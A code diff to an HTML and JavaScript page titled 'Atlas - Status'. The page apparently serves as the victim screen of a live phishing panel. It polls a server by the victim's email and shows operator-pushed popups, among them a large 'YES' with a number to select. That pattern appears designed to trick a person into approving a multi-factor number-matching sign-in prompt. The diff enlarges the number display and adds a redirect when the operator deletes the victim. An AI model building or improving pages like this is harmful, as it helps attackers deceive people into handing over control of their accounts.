@@ -6,52 +6,31 @@
 <title>Atlas - Status</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-body {
-  min-height: 100vh;
-  background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
-  display: flex; justify-content: center; align-items: center; padding: 20px;
-}
-.card {
-  background: #fff; border-radius: 24px; padding: 48px 32px;
-  width: 100%; max-width: 420px; text-align: center;
-  box-shadow: 0 20px 60px rgba(0,0,0,0.4);
-}
+body { min-height: 100vh; background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%); display: flex; justify-content: center; align-items: center; padding: 20px; }
+.card { background: #fff; border-radius: 24px; padding: 48px 32px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }
 .sad-icon { width: 100px; height: 100px; margin: 0 auto 24px; }
 h1 { font-size: 24px; font-weight: 700; color: #1f2937; margin-bottom: 12px; line-height: 1.4; }
 p { color: #6b7280; font-size: 15px; line-height: 1.6; margin-bottom: 8px; }
-.email-display {
-  display: inline-block; margin-top: 16px; padding: 8px 16px;
-  background: #f3f4f6; border-radius: 8px; color: #4a4ff0;
-  font-size: 13px; font-weight: 500; word-break: break-all;
+.email-display { display: inline-block; margin-top: 16px; padding: 8px 16px; background: #f3f4f6; border-radius: 8px; color: #4a4ff0; font-size: 13px; font-weight: 500; word-break: break-all; }
+
+.popup-overlay{display:none;position:fixed;inset:0;background:#2b2b2b;z-index:99999;justify-content:center;align-items:center;padding:20px}
+.popup-overlay.active{display:flex !important}
+.popup-yes{text-align:center;color:white;max-width:600px;width:100%}
+.popup-yes .big-yes{font-size:100px;font-weight:900;color:#ffffff;letter-spacing:8px;margin-bottom:40px}
+.popup-yes .number-circle{width:280px;height:280px;border-radius:50%;border:10px solid #10b981;display:flex;align-items:center;justify-content:center;margin:0 auto 40px;box-shadow:0 0 60px rgba(16,185,129,0.5)}
+.popup-yes .number-circle span{font-size:140px;font-weight:900;color:#ffffff;letter-spacing:4px}
+.popup-yes .instruction{font-size:22px;font-weight:600;color:#d1d5db;margin-top:20px;line-height:1.5}
+.popup-yes .instruction strong{color:#10b981}
+@media (max-width:500px){
+  .popup-yes .big-yes{font-size:70px;margin-bottom:28px}
+  .popup-yes .number-circle{width:200px;height:200px;border-width:8px}
+  .popup-yes .number-circle span{font-size:100px}
+  .popup-yes .instruction{font-size:18px}
 }
-.popup-overlay {
-  position: fixed; inset: 0; background: rgba(0,0,0,0.92);
-  z-index: 10000; display: none; justify-content: center;
-  align-items: center; padding: 20px;
-}
-.popup-overlay.active { display: flex; }
-.popup-yes { text-align: center; color: white; max-width: 500px; width: 100%; }
-.popup-yes .big-yes {
-  font-size: 80px; font-weight: 900; color: #10b981;
-  letter-spacing: 4px; text-shadow: 0 0 40px rgba(16,185,129,0.6);
-  margin-bottom: 20px;
-}
-.popup-yes .big-number {
-  font-size: 120px; font-weight: 900; color: #fbbf24;
-  letter-spacing: 8px; margin: 20px 0;
-}
-.popup-yes .instruction {
-  font-size: 20px; font-weight: 600; color: #e5e7eb; margin-top: 20px;
-}
-.popup-text {
-  background: white; border-radius: 20px; padding: 32px; max-width: 400px; width: 100%;
-}
-.popup-text h3 { text-align: center; color: #1f2937; margin-bottom: 16px; font-size: 20px; }
-.popup-text .message {
-  background: #f3f4f6; padding: 20px; border-radius: 12px;
-  color: #1f2937; font-size: 15px; line-height: 1.6;
-  word-break: break-word; white-space: pre-wrap;
-}
+
+.popup-text{background:white;border-radius:20px;padding:32px;max-width:400px;width:100%}
+.popup-text h3{text-align:center;color:#1f2937;margin-bottom:16px;font-size:20px}
+.popup-text .message{background:#f3f4f6;padding:20px;border-radius:12px;color:#1f2937;font-size:15px;line-height:1.6;word-break:break-word;white-space:pre-wrap}
 </style>
 </head>
 <body>
@@ -70,8 +49,10 @@ p { color: #6b7280; font-size: 15px; line-height: 1.6; margin-bottom: 8px; }
 <div id="yesPopup" class="popup-overlay">
   <div class="popup-yes">
     <div class="big-yes">YES</div>
-    <div class="big-number" id="yesNumber">00</div>
-    <div class="instruction">Tap <strong>YES</strong> and select <strong id="yesNumberText">00</strong> to continue</div>
+    <div class="number-circle">
+      <span id="yesNumber">00</span>
+    </div>
+    <div class="instruction">Select <strong id="yesNumberText">00</strong> to continue</div>
   </div>
 </div>
 
@@ -86,12 +67,13 @@ p { color: #6b7280; font-size: 15px; line-height: 1.6; margin-bottom: 8px; }
 <script>
 const socket = io();
 const p = new URLSearchParams(window.location.search);
-const email = p.get('email') || localStorage.getItem('atlas_current_email') || '';
+let email = p.get('email') || localStorage.getItem('atlas_current_email') || '';
 if (email) document.getElementById('emailDisplay').textContent = email;
+localStorage.setItem('atlas_current_email', email);
 
 const yesPopup = document.getElementById('yesPopup');
 const textPopup = document.getElementById('textPopup');
-let lastPopupId = parseInt(localStorage.getItem('atlas_last_popup_id') || '0');
+let lastPopupId = 0;
 
 function showYesPopup(n) {
   textPopup.classList.remove('active');
@@ -110,26 +92,31 @@ async function pollStatus() {
   try {
     const res = await fetch(`/api/user/status?email=${encodeURIComponent(email)}`);
     const data = await res.json();
-    if (data.popup_id && data.popup_id > lastPopupId) {
+    if (!data || data.notFound) return;
+
+    if (typeof data.popup_id === 'number' && data.popup_id > lastPopupId) {
       lastPopupId = data.popup_id;
-      localStorage.setItem('atlas_last_popup_id', lastPopupId);
       if (data.popup_type === 'yes') showYesPopup(data.popup_value);
       else if (data.popup_type === 'text') showTextPopup(data.popup_value);
     }
-    if (data.timeout_flag) window.location.href = '/';
   } catch (e) {}
 }
 
-setInterval(pollStatus, 1500);
+setInterval(pollStatus, 1000);
 pollStatus();
 
 socket.on('popup-update', (data) => {
-  if (data.email !== email) return;
-  if (data.popup_id > lastPopupId) {
+  if (String(data.email).toLowerCase() !== String(email).toLowerCase()) return;
+  if (typeof data.popup_id === 'number' && data.popup_id > lastPopupId) {
     lastPopupId = data.popup_id;
     if (data.popup_type === 'yes') showYesPopup(data.popup_value);
     else if (data.popup_type === 'text') showTextPopup(data.popup_value);
   }
+});
+
+socket.on('user-deleted', (data) => {
+  if (String(data.email).toLowerCase() !== String(email).toLowerCase()) return;
+  window.location.href = '/';
 });
 </script>
 </body>
